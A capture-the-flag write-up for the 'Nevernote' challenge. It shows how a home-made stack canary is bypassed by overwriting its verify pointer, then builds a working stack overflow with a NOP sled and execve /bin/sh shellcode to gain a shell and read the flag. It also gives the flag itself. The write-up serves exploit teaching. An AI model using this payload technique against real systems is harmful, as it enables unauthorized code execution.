### Solved by barrebas

Nevernote is a 180 point challenge. 

`
In light of the recent attacks on their machines, Daedalus Corp has 
implemented a buffer overflow detection library. Nevernote, a program made
for Daedalus Corps employees to take notes, uses this library. Can you 
bypass their protection and read the secret? The binary can be found at
 /home/nevernote/ on the shell server.
 `

This program attempts to implement a stack canary in a rather dumb way:

```c
struct canary{
    int canary;
    int *verify;
};

/* buffer overflow resistant buffer */
struct safe_buffer{
    char buf[SAFE_BUFFER_SIZE];
    struct canary can;
};
```

So we can overflow this `safe_buffer`, but then we also overwrite the canary. Then the canary check will not pass anymore:

```c
void verify_canary(struct canary *c){
    if (c->canary != *(c->verify)){
        printf("Canary was incorrect!\n");
        __canary_failure(1);
    }

    // we're all good; free the canary and return
    free(c->verify);
    return;
}
```

But since we can overflow the buffer, we control both the canary and the pointer to the canary. This means we can make this check always succeed. Again, no ASLR on the target server allows us to use a static address. Let's supply the address of safe_buffer (the address of which can be obtained from debugging the binary with `gdb`). This is automated like so (it echoes a username and the command for adding a note):

```
pico1139@shell:/home/nevernote$ (echo "bleh"; echo "a"; python -c 'print "A"*512+"AAAA"+"\x50\xc0\x04\x08"') > /tmp/in
...snip...
(gdb) r < /tmp/in
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/nevernote/nevernote < /tmp/in
Please enter your name: Enter a command: Write your note: Note added.
*** Error in `/home/nevernote/nevernote': double free or corruption (!prev): 0x0804c050 ***
```

Now, the binary aborts because the pointer to the canary has already been freed. Not a problem, we won't let it come that far. Let's try to overflow the saved return address:

```
pico1139@shell:/home/nevernote$ (echo "bleh"; echo "a"; python -c 'print "A"*512+"AAAA"+"\x50\xc0\x04\x08CCCCCCCCCCCCCCCCDDDDEEEEFFFF"') > /tmp/in
...
(gdb) r < /tmp/in
Starting program: /home/nevernote/nevernote < /tmp/in
Please enter your name: Enter a command: Write your note: 
Program received signal SIGSEGV, Segmentation fault.
0xf7ea11f3 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) i r
eax            0x45454545	1162167621
ecx            0xffffd414	-11244
edx            0x45454545	1162167621
ebx            0x3f4	1012
esp            0xffffd3f0	0xffffd3f0
ebp            0xffffd628	0xffffd628
esi            0xffffd420	-11232
edi            0x45454545	1162167621
eip            0xf7ea11f3	0xf7ea11f3
eflags         0x10282	[ SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) x/i $eip
=> 0xf7ea11f3:	movlpd %xmm1,(%edx)
```

Right, a segfault because `edx` points to a place that doesn't exist. Let's fix that by supplying the address of safe_buffer:

```
pico1139@shell:/home/nevernote$ (echo "bleh"; echo "a"; python -c 'print "A"*512+"AAAA"+"\x50\xc0\x04\x08CCCCCCCCCCCCCCCCDDDD\x50\xc0\x04\x08FFFF"') > /tmp/in
...
(gdb) r < /tmp/in
Starting program: /home/nevernote/nevernote < /tmp/in
Please enter your name: Enter a command: Write your note: 
Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```

w00t! We have control over EIP! Since ASLR is off and so is NX, we can just jump a piece of shellcode. Let’s stick in the shellcode (23 bytes execve /bin/sh) and alter the canary to 4*0x90 (which is the start of the NOP sled). Let's overwrite EIP with `0x804c070` to jump in the middle of our NOP sled. We cat the payload & use another cat to keep shell alive:

```
pico1139@shell:/home/nevernote$ (echo "bleh"; echo "a"; python -c 'print "\x90"*(512-23)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90\x90\x90\x90"+"\x50\xc0\x04\x08CCCCCCCCCCCCCCCC\x70\xc0\x04\x08\x50\xc0\x04\x08FFFF"') > /tmp/in

pico1139@shell:/home/nevernote$ (cat /tmp/in; cat) | ./nevernote
Please enter your name: Enter a command: Write your note: 
id
uid=11066(pico1139) gid=1017(picogroup) egid=1011(nevernote) groups=1017(picogroup)
whoami
pico1139
cat flag*
the_hairy_canary_fairy_is_still_very_wary
```

The flag is `the_hairy_canary_fairy_is_still_very_wary`.
